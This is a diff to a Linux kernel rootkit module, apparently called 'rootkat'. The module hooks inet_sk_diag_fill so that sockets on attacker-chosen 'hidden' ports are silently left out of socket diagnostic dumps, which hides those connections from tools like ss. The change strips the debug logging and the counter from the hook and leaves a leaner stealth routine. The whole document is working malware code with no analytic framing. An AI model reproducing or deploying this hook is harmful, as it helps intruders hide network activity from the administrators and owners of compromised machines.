@@ -1,5 +1,4 @@
 // SPDX-License-Identifier: MIT
-#include <linux/atomic.h>
 #include <linux/kernel.h>
 #include <linux/kmod.h>
 #include <linux/netlink.h>
@@ -41,8 +40,6 @@ static struct rootkat_hook hook_inet_sk_diag_fill = {
  * no entry for it. Negative return values would abort the dump, so
  * never propagate a "skip" as an error.
  */
-static atomic_t rootkat_diag_fires = ATOMIC_INIT(0);
-
 static int rootkat_inet_sk_diag_fill(struct sock *sk,
                                      struct inet_connection_sock *icsk,
                                      struct sk_buff *skb,
@@ -52,16 +49,9 @@ static int rootkat_inet_sk_diag_fill(struct sock *sk,
 {
 	inet_sk_diag_fill_t orig =
 		(inet_sk_diag_fill_t)hook_inet_sk_diag_fill.original;
-	u16 port = sk ? sk->sk_num : 0;
-	int n = atomic_inc_return(&rootkat_diag_fires);
 
-	if (n <= 5)
-		pr_info(TAG "fire #%d port=%u\n", n, port);
-
-	if (sk && rootkat_is_port_hidden(port)) {
-		pr_info(TAG "skipping port %u\n", port);
+	if (sk && rootkat_is_port_hidden(sk->sk_num))
 		return 0;
-	}
 
 	return orig(sk, icsk, skb, cb, req, nlmsg_flags, net_admin);
 }
